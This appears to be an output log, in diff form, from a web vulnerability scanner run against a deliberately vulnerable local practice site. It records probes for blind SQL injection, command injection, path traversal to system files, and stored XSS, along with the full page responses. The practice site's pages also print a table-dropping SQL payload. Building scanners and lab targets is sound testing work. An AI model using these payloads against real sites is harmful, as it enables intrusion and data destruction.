+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+ negative Result: 
+<html><head></head><body>
+        <h1> File Inclusion Attacks </h1>
+        <p>This site contains the possibility for File Inclusions like Local and Remote File Inclusion</p>
+        <p>The given file path will be executed by subprocess.run()</p>
+        <p>Example input: test.py</p>
+        
+        <form>
+            <label for="fi">File input:
+                <input id="fi" name="fi"><button type="submit">submit</button><br>
+            </label>
+        </form>
+        
+        <p>File executed: '+or+1%3D2%23'; Result: </p>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/fileinclusion.html?fi="+or+1%3D1%23"; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head></head><body>
+        <h1> File Inclusion Attacks </h1>
+        <p>This site contains the possibility for File Inclusions like Local and Remote File Inclusion</p>
+        <p>The given file path will be executed by subprocess.run()</p>
+        <p>Example input: test.py</p>
+        
+        <form>
+            <label for="fi">File input:
+                <input id="fi" name="fi"><button type="submit">submit</button><br>
+            </label>
+        </form>
+        
+        <p>File executed: "+or+1%3D1%23"; Result: </p>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+ negative Result: 
+<html><head></head><body>
+        <h1> File Inclusion Attacks </h1>
+        <p>This site contains the possibility for File Inclusions like Local and Remote File Inclusion</p>
+        <p>The given file path will be executed by subprocess.run()</p>
+        <p>Example input: test.py</p>
+        
+        <form>
+            <label for="fi">File input:
+                <input id="fi" name="fi"><button type="submit">submit</button><br>
+            </label>
+        </form>
+        
+        <p>File executed: '+or+1%3D2%23'; Result: </p>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/fileinclusion.html?fi='+or+1%3D1--'; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head></head><body>
+        <h1> File Inclusion Attacks </h1>
+        <p>This site contains the possibility for File Inclusions like Local and Remote File Inclusion</p>
+        <p>The given file path will be executed by subprocess.run()</p>
+        <p>Example input: test.py</p>
+        
+        <form>
+            <label for="fi">File input:
+                <input id="fi" name="fi"><button type="submit">submit</button><br>
+            </label>
+        </form>
+        
+        <p>File executed: '+or+1%3D1--'; Result: </p>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+ negative Result: 
+<html><head></head><body>
+        <h1> File Inclusion Attacks </h1>
+        <p>This site contains the possibility for File Inclusions like Local and Remote File Inclusion</p>
+        <p>The given file path will be executed by subprocess.run()</p>
+        <p>Example input: test.py</p>
+        
+        <form>
+            <label for="fi">File input:
+                <input id="fi" name="fi"><button type="submit">submit</button><br>
+            </label>
+        </form>
+        
+        <p>File executed: '+or+1%3D2%23'; Result: </p>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible SQL injection (Blind): http://127.0.0.1:8000/fileinclusion.html?fi="+or+1%3D1--"; Evidence: The Input is not found in the response and check with negative '1=2' input differs
+request answer:
+<html><head></head><body>
+        <h1> File Inclusion Attacks </h1>
+        <p>This site contains the possibility for File Inclusions like Local and Remote File Inclusion</p>
+        <p>The given file path will be executed by subprocess.run()</p>
+        <p>Example input: test.py</p>
+        
+        <form>
+            <label for="fi">File input:
+                <input id="fi" name="fi"><button type="submit">submit</button><br>
+            </label>
+        </form>
+        
+        <p>File executed: "+or+1%3D1--"; Result: </p>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+ negative Result: 
+<html><head></head><body>
+        <h1> File Inclusion Attacks </h1>
+        <p>This site contains the possibility for File Inclusions like Local and Remote File Inclusion</p>
+        <p>The given file path will be executed by subprocess.run()</p>
+        <p>Example input: test.py</p>
+        
+        <form>
+            <label for="fi">File input:
+                <input id="fi" name="fi"><button type="submit">submit</button><br>
+            </label>
+        </form>
+        
+        <p>File executed: '+or+1%3D2%23'; Result: </p>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible CMD Injection: http://127.0.0.1:8000/cmdinjection.html?cmdi=echo kasodjfka; Evidence: 'kasodjfka' found in response but not 'echo kasodjfka'
+request answer:
+<html><head></head><body>
+        <h1> Command Injection Attacks </h1>
+        <p>This site contains the possibility for Command Injection</p>
+        <p>The given input will be directly executed by subprocess.run()</p>
+        <p>Example input: echo Hallo</p>
+        
+        <form>
+            <label for="cmdi">File input:
+                <input id="cmdi" name="cmdi"><button type="submit">submit</button><br>
+            </label>
+        </form>
+        
+        <p>Command executed: kasodjfka
+</p>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible PHP Injection: http://127.0.0.1:8000/xss.html?xss=1;echo testtesttest;; Evidence: 'testtesttest' found in response but not the injection command
+request answer:
+<html><head></head><body>
+        <h1> XSS-attacks </h1>
+        <p>This site contains the possibility for XSS-attacks</p>
+        <p> Possible xss-exploit input: &lt; script &gt; alert(1) &lt; /script &gt; (Remove space after the &lt; chars)</p> 
+        
+        <form>
+            <label for="xss">XSS-Input:
+                <!-- possible xss-exploit input: <script> alert(1) </script> -->
+                <input id="xss" name="xss"><button type="submit">Submit</button><br>
+            </label>
+            <label for="out">output:
+                <output id="out_table_cont">1;echo testtesttest;</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible PHP Injection: http://127.0.0.1:8000/sqlinjection.html?sql_insert=1;echo testtesttest;; Evidence: 'testtesttest' found in response but not the injection command
+request answer:
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "'+or+1%3D1%23'"), (3, "'+or+1%3D2%23'"), (4, '"+or+1%3D1%23"'), (5, "'+or+1%3D2%23'"), (6, "'+or+1%3D1--'"), (7, "'+or+1%3D2%23'"), (8, '"+or+1%3D1--"'), (9, "'+or+1%3D2%23'"), (10, 'echo kasodjfka'), (11, '1;echo testtesttest;')]</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible PHP Injection: http://127.0.0.1:8000/sqlinjection.html?sql=1;echo testtesttest;; Evidence: 'testtesttest' found in response but not the injection command
+request answer:
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">.</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">[(11, '1;echo testtesttest;')]</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible PHP Injection: http://127.0.0.1:8000/fileinclusion.html?fi=1;echo testtesttest;; Evidence: 'testtesttest' found in response but not the injection command
+request answer:
+<html><head></head><body>
+        <h1> File Inclusion Attacks </h1>
+        <p>This site contains the possibility for File Inclusions like Local and Remote File Inclusion</p>
+        <p>The given file path will be executed by subprocess.run()</p>
+        <p>Example input: test.py</p>
+        
+        <form>
+            <label for="fi">File input:
+                <input id="fi" name="fi"><button type="submit">submit</button><br>
+            </label>
+        </form>
+        
+        <p>File executed: 1;echo testtesttest;; Result: </p>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible Path Traversal/Local File Inclusion: http://127.0.0.1:8000/cmdinjection.html?cmdi=C:\windows\win.ini; Evidence: timeout of the response probably because of the open file
+request answer:
+-----------------------------------------------------------------------------
+Possible XSS (Permanent): http://127.0.0.1:8000/xss.html?xss=<img src='x' onerror='alert(1)'>; Evidence: <img src='x' onerror='alert(1)'> found in response
+request answer:
+<html><head></head><body>
+        <h1> XSS-attacks </h1>
+        <p>This site contains the possibility for XSS-attacks</p>
+        <p> Possible xss-exploit input: &lt; script &gt; alert(1) &lt; /script &gt; (Remove space after the &lt; chars)</p> 
+        
+        <form>
+            <label for="xss">XSS-Input:
+                <!-- possible xss-exploit input: <script> alert(1) </script> -->
+                <input id="xss" name="xss"><button type="submit">Submit</button><br>
+            </label>
+            <label for="out">output:
+                <output id="out_table_cont"><img src="x" onerror="alert(1)"></output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible XSS (Permanent): http://127.0.0.1:8000/xss.html?xss=<script> alert(1) </script>; Evidence: <script> alert(1) </script> found in response
+request answer:
+<html><head></head><body>
+        <h1> XSS-attacks </h1>
+        <p>This site contains the possibility for XSS-attacks</p>
+        <p> Possible xss-exploit input: &lt; script &gt; alert(1) &lt; /script &gt; (Remove space after the &lt; chars)</p> 
+        
+        <form>
+            <label for="xss">XSS-Input:
+                <!-- possible xss-exploit input: <script> alert(1) </script> -->
+                <input id="xss" name="xss"><button type="submit">Submit</button><br>
+            </label>
+            <label for="out">output:
+                <output id="out_table_cont"><script> alert(1) </script></output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible XSS (Permanent): http://127.0.0.1:8000/sqlinjection.html?sql_insert=<img src='x' onerror='alert(1)'>; Evidence: <img src='x' onerror='alert(1)'> found in response
+request answer:
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "'+or+1%3D1%23'"), (3, "'+or+1%3D2%23'"), (4, '"+or+1%3D1%23"'), (5, "'+or+1%3D2%23'"), (6, "'+or+1%3D1--'"), (7, "'+or+1%3D2%23'"), (8, '"+or+1%3D1--"'), (9, "'+or+1%3D2%23'"), (10, 'echo kasodjfka'), (11, '1;echo testtesttest;'), (12, '/etc/passwd'), (13, 'C:\\windows\\win.ini'), (14, 'index.html'), (15, "<img src="x" onerror="alert(1)">")]</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible XSS (Permanent): http://127.0.0.1:8000/sqlinjection.html?sql_insert=<script> alert(1) </script>; Evidence: <script> alert(1) </script> found in response
+request answer:
+<html><head>
+        <title>SQL-Injection</title>
+    </head>
+    <body>
+        <h1> SQL-Injection </h1>
+        <p>A SQL-Injection weakness is present on this site</p>
+        
+        <form>
+            <label for="sql_insert">SQL data input:
+                <input id="sql_insert" name="sql_insert">
+            </label>
+            <button type="submit" name="submit_insert" value="0">submit</button> <br>
+            <label for="out_table_cont">Table content:
+                <output id="out_table_cont">[(1, "'; set @test = 'ksdjkfl'; select @test; #"), (2, "'+or+1%3D1%23'"), (3, "'+or+1%3D2%23'"), (4, '"+or+1%3D1%23"'), (5, "'+or+1%3D2%23'"), (6, "'+or+1%3D1--'"), (7, "'+or+1%3D2%23'"), (8, '"+or+1%3D1--"'), (9, "'+or+1%3D2%23'"), (10, 'echo kasodjfka'), (11, '1;echo testtesttest;'), (12, '/etc/passwd'), (13, 'C:\\windows\\win.ini'), (14, 'index.html'), (15, "<img src="x" onerror="alert(1)">"), (16, '<script> alert(1) </script>')]</output>
+            </label>
+        </form>
+        
+        <p id="Exploit">The given Input is injected unchecked into the query "Select * from htmlInput where input = '-input-'"</p>
+        <p id="Exploit">Possible exploit: '; drop table htmlInput; select * from htmlInput where input = ' </p>
+        
+        <form>
+        <!-- Exploit input: '; drop table htmlInput; select * from htmlInput where input = ' -->
+            <label for="sql">SQL where query input:
+                <input id="sql" name="sql">
+            </label>
+            <button type="submit" name="submit_where" value="0">submit</button> <br>
+            <label for="out">Result:
+                <output id="out">.</output>
+            </label>
+        </form>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/fileinclusion.html">Here you can try File Inclusions</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible XSS (Permanent): http://127.0.0.1:8000/fileinclusion.html?fi=<img src='x' onerror='alert(1)'>; Evidence: <img src='x' onerror='alert(1)'> found in response
+request answer:
+<html><head></head><body>
+        <h1> File Inclusion Attacks </h1>
+        <p>This site contains the possibility for File Inclusions like Local and Remote File Inclusion</p>
+        <p>The given file path will be executed by subprocess.run()</p>
+        <p>Example input: test.py</p>
+        
+        <form>
+            <label for="fi">File input:
+                <input id="fi" name="fi"><button type="submit">submit</button><br>
+            </label>
+        </form>
+        
+        <p>File executed: <img src="x" onerror="alert(1)">; Result: </p>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
+Possible XSS (Permanent): http://127.0.0.1:8000/fileinclusion.html?fi=<script> alert(1) </script>; Evidence: <script> alert(1) </script> found in response
+request answer:
+<html><head></head><body>
+        <h1> File Inclusion Attacks </h1>
+        <p>This site contains the possibility for File Inclusions like Local and Remote File Inclusion</p>
+        <p>The given file path will be executed by subprocess.run()</p>
+        <p>Example input: test.py</p>
+        
+        <form>
+            <label for="fi">File input:
+                <input id="fi" name="fi"><button type="submit">submit</button><br>
+            </label>
+        </form>
+        
+        <p>File executed: <script> alert(1) </script>; Result: </p>
+        
+        <p id="Links">
+            <a href="http://localhost:8000/index.html">This link leads to the homepage</a><br>
+            <a href="http://localhost:8000/sqlinjection.html">Here you can try SQL-Injection</a><br>
+            <a href="http://localhost:8000/xss.html">Here you can try XSS-attacks</a><br>
+            <a href="http://localhost:8000/cmdinjection.html">Here you can try command injections</a><br>
+            <a href="http://localhost:8000/phpinjection.html">Here you can try PHP-Injections</a><br>
+        </p>
+    
+</body></html>
+-----------------------------------------------------------------------------
